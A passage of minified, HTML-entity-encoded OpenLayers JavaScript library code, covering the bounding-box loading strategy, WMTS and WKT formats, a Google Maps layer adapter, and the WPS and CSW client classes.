a&#125;,CLASS_NAME:"OpenLayers.Control.EditingToolbar"&#125;);OpenLayers.Strategy.BBOX=OpenLayers.Class(OpenLayers.Strategy,&#123;bounds:null,resolution:null,ratio:2,resFactor:null,response:null,activate:function()&#123;var a=OpenLayers.Strategy.prototype.activate.call(this);a&amp;&amp;(this.layer.events.on(&#123;moveend:this.update,refresh:this.update,visibilitychanged:this.update,scope:this&#125;),this.update());return a&#125;,deactivate:function()&#123;var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;this.layer.events.un(&#123;moveend:this.update,refresh:this.update,visibilitychanged:this.update,scope:this&#125;);return a&#125;,update:function(a)&#123;var b=this.getMapBounds();null!==b&amp;&amp;(a&amp;&amp;a.force||this.layer.visibility&amp;&amp;this.layer.calculateInRange()&amp;&amp;this.invalidBounds(b))&amp;&amp;(this.calculateBounds(b),this.resolution=this.layer.map.getResolution(),this.triggerRead(a))&#125;,getMapBounds:function()&#123;if(null===this.layer.map)return null;var a=this.layer.map.getExtent();a&amp;&amp;!this.layer.projection.equals(this.layer.map.getProjectionObject())&amp;&amp;(a=a.clone().transform(this.layer.map.getProjectionObject(),this.layer.projection));return a&#125;,invalidBounds:function(a)&#123;a||(a=this.getMapBounds());a=!this.bounds||!this.bounds.containsBounds(a);!a&amp;&amp;this.resFactor&amp;&amp;(a=this.resolution/this.layer.map.getResolution(),a=a&gt;=this.resFactor||a&lt;=1/this.resFactor);return a&#125;,calculateBounds:function(a)&#123;a||(a=this.getMapBounds());var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;this.bounds=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2)&#125;,triggerRead:function(a)&#123;!this.response||a&amp;&amp;!0===a.noAbort||(this.layer.protocol.abort(this.response),this.layer.events.triggerEvent("loadend"));var b=&#123;filter:this.createFilter()&#125;;this.layer.events.triggerEvent("loadstart",b);this.response=this.layer.protocol.read(OpenLayers.Util.applyDefaults(&#123;filter:b.filter,callback:this.merge,scope:this&#125;,a))&#125;,createFilter:function()&#123;var a=new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.BBOX,value:this.bounds,projection:this.layer.projection&#125;);this.layer.filter&amp;&amp;(a=new OpenLayers.Filter.Logical(&#123;type:OpenLayers.Filter.Logical.AND,filters:[this.layer.filter,a]&#125;));return a&#125;,merge:function(a)&#123;this.layer.destroyFeatures();if(a.success())&#123;var b=a.features;if(b&amp;&amp;0&lt;b.length)&#123;var c=this.layer.projection,d=this.layer.map.getProjectionObject();if(!d.equals(c))for(var e,f=0,g=b.length;f&lt;g;++f)(e=b[f].geometry)&amp;&amp;e.transform(c,d);this.layer.addFeatures(b)&#125;&#125;else this.bounds=null;this.response=null;this.layer.events.triggerEvent("loadend",&#123;response:a&#125;)&#125;,CLASS_NAME:"OpenLayers.Strategy.BBOX"&#125;);OpenLayers.Layer.WorldWind=OpenLayers.Class(OpenLayers.Layer.Grid,&#123;DEFAULT_PARAMS:&#123;&#125;,isBaseLayer:!0,lzd:null,zoomLevels:null,initialize:function(a,b,c,d,e,f)&#123;this.lzd=c;this.zoomLevels=d;c=[];c.push(a,b,e,f);OpenLayers.Layer.Grid.prototype.initialize.apply(this,c);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS)&#125;,getZoom:function()&#123;var a=this.map.getZoom();this.map.getMaxExtent();return a-=Math.log(this.maxResolution/(this.lzd/512))/Math.log(2)&#125;,getURL:function(a)&#123;a=this.adjustBounds(a);var b=this.getZoom(),c=this.map.getMaxExtent(),d=this.lzd/Math.pow(2,this.getZoom()),e=Math.floor((a.left-c.left)/d);a=Math.floor((a.bottom-c.bottom)/d);return this.map.getResolution()&lt;=this.lzd/512&amp;&amp;this.getZoom()&lt;=this.zoomLevels?this.getFullRequestString(&#123;L:b,X:e,Y:a&#125;):OpenLayers.Util.getImageLocation("blank.gif")&#125;,CLASS_NAME:"OpenLayers.Layer.WorldWind"&#125;);OpenLayers.Protocol.CSW=function(a)&#123;a=OpenLayers.Util.applyDefaults(a,OpenLayers.Protocol.CSW.DEFAULTS);var b=OpenLayers.Protocol.CSW["v"+a.version.replace(/\./g,"_")];if(!b)throw"Unsupported CSW version: "+a.version;return new b(a)&#125;;OpenLayers.Protocol.CSW.DEFAULTS=&#123;version:"2.0.2"&#125;;OpenLayers.Format.WMTSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.0.0",yx:&#123;"urn:ogc:def:crs:EPSG::4326":!0&#125;,createLayer:function(a,b)&#123;if(!("layer"in b))throw Error("Missing property 'layer' in configuration.");for(var c=a.contents,d,e=0,f=c.layers.length;e&lt;f;++e)if(c.layers[e].identifier===b.layer)&#123;d=c.layers[e];break&#125;if(!d)throw Error("Layer not found");var g=b.format;!g&amp;&amp;(d.formats&amp;&amp;d.formats.length)&amp;&amp;(g=d.formats[0]);var h;b.matrixSet?h=c.tileMatrixSets[b.matrixSet]:1&lt;=d.tileMatrixSetLinks.length&amp;&amp;(h=c.tileMatrixSets[d.tileMatrixSetLinks[0].tileMatrixSet]);if(!h)throw Error("matrixSet not found");for(var k,e=0,f=d.styles.length;e&lt;f&amp;&amp;(k=d.styles[e],!k.isDefault);++e);c=b.requestEncoding;if(!c&amp;&amp;(c="KVP",a.operationsMetadata.GetTile.dcp.http))&#123;var l=a.operationsMetadata.GetTile.dcp.http;l.get[0].constraints&amp;&amp;(l=l.get[0].constraints.GetEncoding.allowedValues,l.KVP||!l.REST&amp;&amp;!l.RESTful||(c="REST"))&#125;var l=[],m=b.params||&#123;&#125;;delete b.params;for(var n=0,p=d.dimensions.length;n&lt;p;n++)&#123;var q=d.dimensions[n];l.push(q.identifier);m.hasOwnProperty(q.identifier)||(m[q.identifier]=q["default"])&#125;var n=b.projection||h.supportedCRS.replace(/urn:ogc:def:crs:(\w+):(.*:)?(\w+)$/,"$1:$3"),p=b.units||("EPSG:4326"===n?"degrees":"m"),q=[],r;for(r in h.matrixIds)h.matrixIds.hasOwnProperty(r)&amp;&amp;q.push(2.8E-4*h.matrixIds[r].scaleDenominator/OpenLayers.METERS_PER_INCH/OpenLayers.INCHES_PER_UNIT[p]);if("REST"===c&amp;&amp;d.resourceUrls)&#123;r=[];for(var f=0,s=d.resourceUrls.length;f&lt;s;++f)e=d.resourceUrls[f],e.format===g&amp;&amp;"tile"===e.resourceType&amp;&amp;r.push(e.template)&#125;else&#123;s=a.operationsMetadata.GetTile.dcp.http.get;r=[];for(var t,e=0,f=s.length;e&lt;f;e++)t=s[e].constraints,(!t||t&amp;&amp;t.GetEncoding.allowedValues[c])&amp;&amp;r.push(s[e].url)&#125;return new OpenLayers.Layer.WMTS(OpenLayers.Util.applyDefaults(b,&#123;url:r,requestEncoding:c,name:d.title,style:k.identifier,format:g,matrixIds:h.matrixIds,matrixSet:h.identifier,projection:n,units:p,resolutions:!1===b.isBaseLayer?void 0:q,serverResolutions:q,tileFullExtent:h.bounds,dimensions:l,params:m&#125;))&#125;,CLASS_NAME:"OpenLayers.Format.WMTSCapabilities"&#125;);OpenLayers.Layer.Google.v3=&#123;DEFAULTS:&#123;sphericalMercator:!0,projection:"EPSG:900913"&#125;,animationEnabled:!0,loadMapObject:function()&#123;this.type||(this.type=google.maps.MapTypeId.ROADMAP);var a,b=OpenLayers.Layer.Google.cache[this.map.id];b?(a=b.mapObject,++b.count):(a=this.map.getCenter(),b=document.createElement("div"),b.className="olForeignContainer",b.style.width="100%",b.style.height="100%",a=new google.maps.Map(b,&#123;center:a?new google.maps.LatLng(a.lat,a.lon):new google.maps.LatLng(0,0),zoom:this.map.getZoom()||0,mapTypeId:this.type,disableDefaultUI:!0,keyboardShortcuts:!1,draggable:!1,disableDoubleClickZoom:!0,scrollwheel:!1,streetViewControl:!1&#125;),b=document.createElement("div"),b.style.width="100%",b.style.height="100%",a.controls[google.maps.ControlPosition.TOP_LEFT].push(b),b=&#123;googleControl:b,mapObject:a,count:1&#125;,OpenLayers.Layer.Google.cache[this.map.id]=b);this.mapObject=a;this.setGMapVisibility(this.visibility)&#125;,onMapResize:function()&#123;this.visibility&amp;&amp;google.maps.event.trigger(this.mapObject,"resize")&#125;,setGMapVisibility:function(a)&#123;var b=OpenLayers.Layer.Google.cache[this.map.id],c=this.map;if(b)&#123;for(var d=this.type,e=c.layers,f,g=e.length-1;0&lt;=g;--g)if(f=e[g],f instanceof OpenLayers.Layer.Google&amp;&amp;!0===f.visibility&amp;&amp;!0===f.inRange)&#123;d=f.type;a=!0;break&#125;e=this.mapObject.getDiv();if(!0===a)&#123;if(e.parentNode!==c.div)if(b.rendered)c.div.appendChild(e),b.googleControl.appendChild(c.viewPortDiv),google.maps.event.trigger(this.mapObject,"resize");else&#123;var h=this;google.maps.event.addListenerOnce(this.mapObject,"tilesloaded",function()&#123;b.rendered=!0;h.setGMapVisibility(h.getVisibility());h.moveTo(h.map.getCenter())&#125;)&#125;this.mapObject.setMapTypeId(d)&#125;else b.googleControl.hasChildNodes()&amp;&amp;(c.div.appendChild(c.viewPortDiv),c.div.removeChild(e))&#125;&#125;,getMapContainer:function()&#123;return this.mapObject.getDiv()&#125;,getMapObjectBoundsFromOLBounds:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,a.right):new OpenLayers.LonLat(a.top,a.right),b=new google.maps.LatLngBounds(new google.maps.LatLng(b.lat,b.lon),new google.maps.LatLng(a.lat,a.lon)));return b&#125;,getMapObjectLonLatFromMapObjectPixel:function(a)&#123;var b=this.map.getSize(),c=this.getLongitudeFromMapObjectLonLat(this.mapObject.center),d=this.getLatitudeFromMapObjectLonLat(this.mapObject.center),e=this.map.getResolution();a=new OpenLayers.LonLat(c+(a.x-b.w/2)*e,d-(a.y-b.h/2)*e);this.wrapDateLine&amp;&amp;(a=a.wrapDateLine(this.maxExtent));return this.getMapObjectLonLatFromLonLat(a.lon,a.lat)&#125;,getMapObjectPixelFromMapObjectLonLat:function(a)&#123;var b=this.getLongitudeFromMapObjectLonLat(a);a=this.getLatitudeFromMapObjectLonLat(a);var c=this.map.getResolution(),d=this.map.getExtent();return this.getMapObjectPixelFromXY(1/c*(b-d.left),1/c*(d.top-a))&#125;,setMapObjectCenter:function(a,b)&#123;if(!1===this.animationEnabled&amp;&amp;b!=this.mapObject.zoom)&#123;var c=this.getMapContainer();google.maps.event.addListenerOnce(this.mapObject,"idle",function()&#123;c.style.visibility=""&#125;);c.style.visibility="hidden"&#125;this.mapObject.setOptions(&#123;center:a,zoom:b&#125;)&#125;,getMapObjectZoomFromMapObjectBounds:function(a)&#123;return this.mapObject.getBoundsZoomLevel(a)&#125;,getMapObjectLonLatFromLonLat:function(a,b)&#123;var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new google.maps.LatLng(c.lat,c.lon)):c=new google.maps.LatLng(b,a);return c&#125;,getMapObjectPixelFromXY:function(a,b)&#123;return new google.maps.Point(a,b)&#125;&#125;;OpenLayers.Format.WPSDescribeProcess=OpenLayers.Class(OpenLayers.Format.XML,&#123;VERSION:"1.0.0",namespaces:&#123;wps:"http://www.opengis.net/wps/1.0.0",ows:"http://www.opengis.net/ows/1.1",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",defaultPrefix:"wps",regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;wps:&#123;ProcessDescriptions:function(a,b)&#123;b.processDescriptions=&#123;&#125;;this.readChildNodes(a,b.processDescriptions)&#125;,ProcessDescription:function(a,b)&#123;var c=&#123;processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion"),statusSupported:"true"===a.getAttribute("statusSupported"),storeSupported:"true"===a.getAttribute("storeSupported")&#125;;this.readChildNodes(a,c);b[c.identifier]=c&#125;,DataInputs:function(a,b)&#123;b.dataInputs=[];this.readChildNodes(a,b.dataInputs)&#125;,ProcessOutputs:function(a,b)&#123;b.processOutputs=[];this.readChildNodes(a,b.processOutputs)&#125;,Output:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.push(c)&#125;,ComplexOutput:function(a,b)&#123;b.complexOutput=&#123;&#125;;this.readChildNodes(a,b.complexOutput)&#125;,LiteralOutput:function(a,b)&#123;b.literalOutput=&#123;&#125;;this.readChildNodes(a,b.literalOutput)&#125;,Input:function(a,b)&#123;var c=&#123;maxOccurs:parseInt(a.getAttribute("maxOccurs")),minOccurs:parseInt(a.getAttribute("minOccurs"))&#125;;this.readChildNodes(a,c);b.push(c)&#125;,BoundingBoxData:function(a,b)&#123;b.boundingBoxData=&#123;&#125;;this.readChildNodes(a,b.boundingBoxData)&#125;,CRS:function(a,b)&#123;b.CRSs||(b.CRSs=&#123;&#125;);b.CRSs[this.getChildValue(a)]=!0&#125;,LiteralData:function(a,b)&#123;b.literalData=&#123;&#125;;this.readChildNodes(a,b.literalData)&#125;,ComplexData:function(a,b)&#123;b.complexData=&#123;&#125;;this.readChildNodes(a,b.complexData)&#125;,Default:function(a,b)&#123;b["default"]=&#123;&#125;;this.readChildNodes(a,b["default"])&#125;,Supported:function(a,b)&#123;b.supported=&#123;&#125;;this.readChildNodes(a,b.supported)&#125;,Format:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.formats||(b.formats=&#123;&#125;);b.formats[c.mimeType]=!0&#125;,MimeType:function(a,b)&#123;b.mimeType=this.getChildValue(a)&#125;&#125;,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows&#125;,CLASS_NAME:"OpenLayers.Format.WPSDescribeProcess"&#125;);OpenLayers.Format.WKT=OpenLayers.Class(OpenLayers.Format,&#123;initialize:function(a)&#123;this.regExes=&#123;typeStr:/^\s*(\w+)\s*\(\s*(.*)\s*\)\s*$/,spaces:/\s+/,parenComma:/\)\s*,\s*\(/,doubleParenComma:/\)\s*\)\s*,\s*\(\s*\(/,trimParens:/^\s*\(?(.*?)\)?\s*$/&#125;;OpenLayers.Format.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;var b,c;a=a.replace(/[\n\r]/g," ");if(c=this.regExes.typeStr.exec(a))if(a=c[1].toLowerCase(),c=c[2],this.parse[a]&amp;&amp;(b=this.parse[a].apply(this,[c])),this.internalProjection&amp;&amp;this.externalProjection)if(b&amp;&amp;"OpenLayers.Feature.Vector"==b.CLASS_NAME)b.geometry.transform(this.externalProjection,this.internalProjection);else if(b&amp;&amp;"geometrycollection"!=a&amp;&amp;"object"==typeof b)for(a=0,c=b.length;a&lt;c;a++)b[a].geometry.transform(this.externalProjection,this.internalProjection);return b&#125;,write:function(a)&#123;var b,c;a.constructor==Array?c=!0:(a=[a],c=!1);var d=[];c&amp;&amp;d.push("GEOMETRYCOLLECTION(");for(var e=0,f=a.length;e&lt;f;++e)c&amp;&amp;0&lt;e&amp;&amp;d.push(","),b=a[e].geometry,d.push(this.extractGeometry(b));c&amp;&amp;d.push(")");return d.join("")&#125;,extractGeometry:function(a)&#123;var b=a.CLASS_NAME.split(".")[2].toLowerCase();if(!this.extract[b])return null;this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return("collection"==b?"GEOMETRYCOLLECTION":b.toUpperCase())+"("+this.extract[b].apply(this,[a])+")"&#125;,extract:&#123;point:function(a)&#123;return a.x+" "+a.y&#125;,multipoint:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.point.apply(this,[a.components[c]])+")");return b.join(",")&#125;,linestring:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b.join(",")&#125;,multilinestring:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")&#125;,polygon:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.linestring.apply(this,[a.components[c]])+")");return b.join(",")&#125;,multipolygon:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push("("+this.extract.polygon.apply(this,[a.components[c]])+")");return b.join(",")&#125;,collection:function(a)&#123;for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extractGeometry.apply(this,[a.components[c]]));return b.join(",")&#125;&#125;,parse:&#123;point:function(a)&#123;a=OpenLayers.String.trim(a).split(this.regExes.spaces);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a[0],a[1]))&#125;,multipoint:function(a)&#123;for(var b=OpenLayers.String.trim(a).split(","),c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.point.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPoint(c))&#125;,linestring:function(a)&#123;a=OpenLayers.String.trim(a).split(",");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(this.parse.point.apply(this,[a[c]]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString(b))&#125;,multilinestring:function(a)&#123;for(var b=OpenLayers.String.trim(a).split(this.regExes.parenComma),c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.linestring.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiLineString(c))&#125;,polygon:function(a)&#123;var b;a=OpenLayers.String.trim(a).split(this.regExes.parenComma);for(var c=[],d=0,e=a.length;d&lt;e;++d)b=a[d].replace(this.regExes.trimParens,"$1"),b=this.parse.linestring.apply(this,[b]).geometry,b=new OpenLayers.Geometry.LinearRing(b.components),c.push(b);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon(c))&#125;,multipolygon:function(a)&#123;for(var b=OpenLayers.String.trim(a).split(this.regExes.doubleParenComma),c=[],d=0,e=b.length;d&lt;e;++d)a=b[d].replace(this.regExes.trimParens,"$1"),c.push(this.parse.polygon.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPolygon(c))&#125;,geometrycollection:function(a)&#123;a=a.replace(/,\s*([A-Za-z])/g,"|$1");a=OpenLayers.String.trim(a).split("|");for(var b=[],c=0,d=a.length;c&lt;d;++c)b.push(OpenLayers.Format.WKT.prototype.read.apply(this,[a[c]]));return b&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WKT"&#125;);OpenLayers.WPSProcess=OpenLayers.Class(&#123;client:null,server:null,identifier:null,description:null,localWPS:"http://geoserver/wps",formats:null,chained:0,executeCallbacks:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.executeCallbacks=[];this.formats=&#123;"application/wkt":new OpenLayers.Format.WKT,"application/json":new OpenLayers.Format.GeoJSON&#125;&#125;,describe:function(a)&#123;a=a||&#123;&#125;;if(!this.description)this.client.describeProcess(this.server,this.identifier,function(b)&#123;this.description||this.parseDescription(b);a.callback&amp;&amp;a.callback.call(a.scope,this.description)&#125;,this);else if(a.callback)&#123;var b=this.description;window.setTimeout(function()&#123;a.callback.call(a.scope,b)&#125;,0)&#125;&#125;,configure:function(a)&#123;this.describe(&#123;callback:function()&#123;var b=this.description,c=a.inputs,d,e,f;e=0;for(f=b.dataInputs.length;e&lt;f;++e)d=b.dataInputs[e],this.setInputData(d,c[d.identifier]);a.callback&amp;&amp;a.callback.call(a.scope)&#125;,scope:this&#125;);return this&#125;,execute:function(a)&#123;this.configure(&#123;inputs:a.inputs,callback:function()&#123;var b=this,c=this.getOutputIndex(b.description.processOutputs,a.output);b.setResponseForm(&#123;outputIndex:c&#125;);(function e()&#123;OpenLayers.Util.removeItem(b.executeCallbacks,e);0!==b.chained?b.executeCallbacks.push(e):OpenLayers.Request.POST(&#123;url:b.client.servers[b.server].url,data:(new OpenLayers.Format.WPSExecute).write(b.description),success:function(e)&#123;var g=b.findMimeType(b.description.processOutputs[c].complexOutput.supported.formats);e=b.formats[g].read(e.responseText);e instanceof OpenLayers.Feature.Vector&amp;&amp;(e=[e]);a.success&amp;&amp;(g=&#123;&#125;,g[a.output||"result"]=e,a.success.call(a.scope,g))&#125;,scope:b&#125;)&#125;)()&#125;,scope:this&#125;)&#125;,output:function(a)&#123;return new OpenLayers.WPSProcess.ChainLink(&#123;process:this,output:a&#125;)&#125;,parseDescription:function(a)&#123;a=this.client.servers[this.server];this.description=(new OpenLayers.Format.WPSDescribeProcess).read(a.processDescription[this.identifier]).processDescriptions[this.identifier]&#125;,setInputData:function(a,b)&#123;delete a.data;delete a.reference;if(b instanceof OpenLayers.WPSProcess.ChainLink)++this.chained,a.reference=&#123;method:"POST",href:b.process.server===this.server?this.localWPS:this.client.servers[b.process.server].url&#125;,b.process.describe(&#123;callback:function()&#123;--this.chained;this.chainProcess(a,b)&#125;,scope:this&#125;);else&#123;a.data=&#123;&#125;;var c=a.complexData;c?(c=this.findMimeType(c.supported.formats),a.data.complexData=&#123;mimeType:c,value:this.formats[c].write(this.toFeatures(b))&#125;):a.data.literalData=&#123;value:b&#125;&#125;&#125;,setResponseForm:function(a)&#123;a=a||&#123;&#125;;var b=this.description.processOutputs[a.outputIndex||0];this.description.responseForm=&#123;rawDataOutput:&#123;identifier:b.identifier,mimeType:this.findMimeType(b.complexOutput.supported.formats,a.supportedFormats)&#125;&#125;&#125;,getOutputIndex:function(a,b)&#123;var c;if(b)for(var d=a.length-1;0&lt;=d;--d)&#123;if(a[d].identifier===b)&#123;c=d;break&#125;&#125;else c=0;return c&#125;,chainProcess:function(a,b)&#123;var c=this.getOutputIndex(b.process.description.processOutputs,b.output);a.reference.mimeType=this.findMimeType(a.complexData.supported.formats,b.process.description.processOutputs[c].complexOutput.supported.formats);var d=&#123;&#125;;d[a.reference.mimeType]=!0;b.process.setResponseForm(&#123;outputIndex:c,supportedFormats:d&#125;);for(a.reference.body=b.process.description;0&lt;this.executeCallbacks.length;)this.executeCallbacks[0]()&#125;,toFeatures:function(a)&#123;var b=OpenLayers.Util.isArray(a);b||(a=[a]);for(var c=Array(a.length),d,e=0,f=a.length;e&lt;f;++e)d=a[e],c[e]=d instanceof OpenLayers.Feature.Vector?d:new OpenLayers.Feature.Vector(d);return b?c:c[0]&#125;,findMimeType:function(a,b)&#123;b=b||this.formats;for(var c in a)if(c in b)return c&#125;,CLASS_NAME:"OpenLayers.WPSProcess"&#125;);OpenLayers.WPSProcess.ChainLink=OpenLayers.Class(&#123;process:null,output:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a)&#125;,CLASS_NAME:"OpenLayers.WPSProcess.ChainLink"&#125;);OpenLayers.WPSClient=OpenLayers.Class(&#123;servers:null,version:"1.0.0",lazy:!1,events:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);this.servers=&#123;&#125;;for(var b in a.servers)this.servers[b]="string"==typeof a.servers[b]?&#123;url:a.servers[b],version:this.version,processDescription:&#123;&#125;&#125;:a.servers[b]&#125;,execute:function(a)&#123;this.getProcess(a.server,a.process).execute(&#123;inputs:a.inputs,success:a.success,scope:a.scope&#125;)&#125;,getProcess:function(a,b)&#123;var c=new OpenLayers.WPSProcess(&#123;client:this,server:a,identifier:b&#125;);this.lazy||c.describe();return c&#125;,describeProcess:function(a,b,c,d)&#123;var e=this.servers[a];e.processDescription[b]?window.setTimeout(function()&#123;c.call(d,e.processDescription[b])&#125;,0):b in e.processDescription?this.events.register("describeprocess",this,function g(a)&#123;a.identifier===b&amp;&amp;(this.events.unregister("describeprocess",this,g),c.call(d,a.raw))&#125;):(e.processDescription[b]=null,OpenLayers.Request.GET(&#123;url:e.url,params:&#123;SERVICE:"WPS",VERSION:e.version,REQUEST:"DescribeProcess",IDENTIFIER:b&#125;,success:function(a)&#123;e.processDescription[b]=a.responseText;this.events.triggerEvent("describeprocess",&#123;identifier:b,raw:a.responseText&#125;)&#125;,scope:this&#125;))&#125;,destroy:function()&#123;this.events.destroy();this.servers=this.events=null&#125;,CLASS_NAME:"OpenLayers.WPSClient"&#125;);OpenLayers.Format.CSWGetRecords.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;csw:"http://www.opengis.net/cat/csw/2.0.2",dc:"http://purl.org/dc/elements/1.1/",dct:"http://purl.org/dc/terms/",gmd:"http://www.isotc211.org/2005/gmd",geonet:"http://www.fao.org/geonetwork",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd",requestId:null,resultType:null,outputFormat:null,outputSchema:null,startPosition:null,maxRecords:null,DistributedSearch:null,ResponseHandler:null,Query:null,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;&#125;;this.readNode(a,b);return b&#125;,readers:&#123;csw:&#123;GetRecordsResponse:function(a,b)&#123;b.records=[];this.readChildNodes(a,b);var c=this.getAttributeNS(a,"","version");""!=c&amp;&amp;(b.version=c)&#125;,RequestId:function(a,b)&#123;b.RequestId=this.getChildValue(a)&#125;,SearchStatus:function(a,b)&#123;b.SearchStatus=&#123;&#125;;var c=this.getAttributeNS(a,"","timestamp");""!=c&amp;&amp;(b.SearchStatus.timestamp=c)&#125;,SearchResults:function(a,b)&#123;this.readChildNodes(a,b);for(var c=a.attributes,d=&#123;&#125;,e=0,f=c.length;e&lt;f;++e)d[c[e].name]="numberOfRecordsMatched"==c[e].name||"numberOfRecordsReturned"==c[e].name||"nextRecord"==c[e].name?parseInt(c[e].nodeValue):c[e].nodeValue;b.SearchResults=d&#125;,SummaryRecord:function(a,b)&#123;var c=&#123;type:"SummaryRecord"&#125;;this.readChildNodes(a,c);b.records.push(c)&#125;,BriefRecord:function(a,b)&#123;var c=&#123;type:"BriefRecord"&#125;;this.readChildNodes(a,c);b.records.push(c)&#125;,DCMIRecord:function(a,b)&#123;var c=&#123;type:"DCMIRecord"&#125;;this.readChildNodes(a,c);b.records.push(c)&#125;,Record:function(a,b)&#123;var c=&#123;type:"Record"&#125;;this.readChildNodes(a,c);b.records.push(c)&#125;,"*":function(a,b)&#123;var c=a.localName||a.nodeName.split(":").pop();b[c]=this.getChildValue(a)&#125;&#125;,geonet:&#123;info:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.gninfo=c&#125;&#125;,dc:&#123;"*":function(a,b)&#123;var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);for(var d=&#123;&#125;,e=a.attributes,f=0,g=e.length;f&lt;g;++f)d[e[f].name]=e[f].nodeValue;d.value=this.getChildValue(a);""!=d.value&amp;&amp;b[c].push(d)&#125;&#125;,dct:&#123;"*":function(a,b)&#123;var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);b[c].push(this.getChildValue(a))&#125;&#125;,ows:OpenLayers.Util.applyDefaults(&#123;BoundingBox:function(a,b)&#123;b.bounds&amp;&amp;(b.BoundingBox=[&#123;crs:b.projection,value:[b.bounds.left,b.bounds.bottom,b.bounds.right,b.bounds.top]&#125;],delete b.projection,delete b.bounds);OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows.BoundingBox.apply(this,arguments)&#125;&#125;,OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows)&#125;,write:function(a)&#123;a=this.writeNode("csw:GetRecords",a);a.setAttribute("xmlns:gmd",this.namespaces.gmd);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;csw:&#123;GetRecords:function(a)&#123;a||(a=&#123;&#125;);var b=this.createElementNSPlus("csw:GetRecords",&#123;attributes:&#123;service:"CSW",version:this.version,requestId:a.requestId||this.requestId,resultType:a.resultType||this.resultType,outputFormat:a.outputFormat||this.outputFormat,outputSchema:a.outputSchema||this.outputSchema,startPosition:a.startPosition||this.startPosition,maxRecords:a.maxRecords||this.maxRecords&#125;&#125;);(a.DistributedSearch||this.DistributedSearch)&amp;&amp;this.writeNode("csw:DistributedSearch",a.DistributedSearch||this.DistributedSearch,b);var c=a.ResponseHandler||this.ResponseHandler;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ResponseHandler",c[d],b);this.writeNode("Query",a.Query||this.Query,b);return b&#125;,DistributedSearch:function(a)&#123;return this.createElementNSPlus("csw:DistributedSearch",&#123;attributes:&#123;hopCount:a.hopCount&#125;&#125;)&#125;,ResponseHandler:function(a)&#123;return 